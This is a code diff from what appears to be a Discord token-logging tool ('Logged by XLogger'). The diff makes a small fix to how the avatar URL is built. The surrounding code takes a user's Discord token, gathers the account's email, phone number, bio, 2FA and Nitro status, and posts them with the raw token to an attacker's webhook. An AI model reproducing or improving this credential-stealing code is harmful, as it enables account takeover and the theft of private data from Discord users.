@@ -88,6 +88,7 @@ def verifytks(token):
                 email = userinfo.get('email', "N/A")
                 id = userinfo.get('id')
                 avatar = userinfo.get('avatar')
+                pfp = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if avatar != None else "'None'"
                 phone = userinfo.get('phone', "N/A")
                 bio = userinfo.get('bio')
                 avatarurl = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if userinfo.get('avatar') else "None"  
@@ -95,10 +96,8 @@ def verifytks(token):
                 nitro = "True" if userinfo.get("premium_type") else "False"
                 mfa = "True" if userinfo.get("mfa_enabled") else "False"
                 locale = userinfo.get('locale')
-                if avatar == "None":
-                    avatarurl = "None"
                 
-                payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"👤 Username","value":f"`{username}`"},{"name":"🪙 Token","value":f"`{token}`"},{"name":"✉️ Email","value":f"`{email}`"},{"name":"📞 Phone","value":f"`{phone}`"},{"name":"🤔 Bio","value":f"`{bioo}`"},{"name":"📷 PFP","value":f"https://cdn.discordapp.com/avatars/{id}/{avatar}"},{"name":"🔑 2FA","value":f"{mfa}"},{"name":"💔 Nitro","value":f"{nitro}","inline":True},{"name":"🤓 Locale","value":f"`{locale}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | Valid","attachments":[]}
+                payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"👤 Username","value":f"`{username}`"},{"name":"🪙 Token","value":f"`{token}`"},{"name":"✉️ Email","value":f"`{email}`"},{"name":"📞 Phone","value":f"`{phone}`"},{"name":"🤔 Bio","value":f"`{bioo}`"},{"name":"📷 PFP","value":f"{pfp}"},{"name":"🔑 2FA","value":f"{mfa}"},{"name":"💔 Nitro","value":f"{nitro}","inline":True},{"name":"🤓 Locale","value":f"`{locale}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | Valid","attachments":[]}
                 webhook = requests.post(webhook, headers=wheaders, json=payload)
                 print(webhook.text)
             hook(webhook)
